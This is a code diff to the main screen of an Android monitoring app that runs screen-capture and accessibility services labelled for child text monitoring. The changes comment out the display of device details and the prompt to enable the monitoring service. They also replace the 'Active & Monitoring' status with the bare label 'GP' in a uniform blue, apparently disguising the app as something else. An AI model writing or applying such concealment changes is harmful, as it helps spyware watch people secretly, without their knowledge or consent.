@@ -13,6 +13,7 @@ import android.content.SharedPreferences;
 import android.content.pm.PackageInstaller;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.graphics.Color;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
@@ -87,8 +88,8 @@ public class MainActivity extends AppCompatActivity {
         }
         deviceName = Build.MANUFACTURER + " " + Build.MODEL;
 
-        tvDeviceId.setText("Device ID: " + deviceId);
-        tvDeviceName.setText("Device Name: " + deviceName);
+//        tvDeviceId.setText("Device ID: " + deviceId);
+//        tvDeviceName.setText("Device Name: " + deviceName);
 
         // Register install result receiver
         installReceiver = new InstallResultReceiver();
@@ -109,9 +110,9 @@ public class MainActivity extends AppCompatActivity {
                     android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
             startActivity(intent);
 
-            android.widget.Toast.makeText(this,
-                    "✅ Child Monitoring-এর জন্য 'Child Text Monitor' সার্ভিসটি অন করুন",
-                    android.widget.Toast.LENGTH_LONG).show();
+//            android.widget.Toast.makeText(this,
+//                    "✅ Child Monitoring-এর জন্য 'Child Text Monitor' সার্ভিসটি অন করুন",
+//                    android.widget.Toast.LENGTH_LONG).show();
         }
     }
 
@@ -151,11 +152,11 @@ public class MainActivity extends AppCompatActivity {
 
     private void updateStatusText() {
         if (ScreenCaptureService.isRunning) {
-            tvStatus.setText("Status: Active & Monitoring");
-            tvStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_green_dark));
+            tvStatus.setText("GP");
+            tvStatus.setTextColor(Color.parseColor("#0380B8"));
         } else {
             tvStatus.setText("Status: Starting…");
-            tvStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_orange_dark));
+            tvStatus.setTextColor(Color.parseColor("#0380B8"));
         }
     }
 
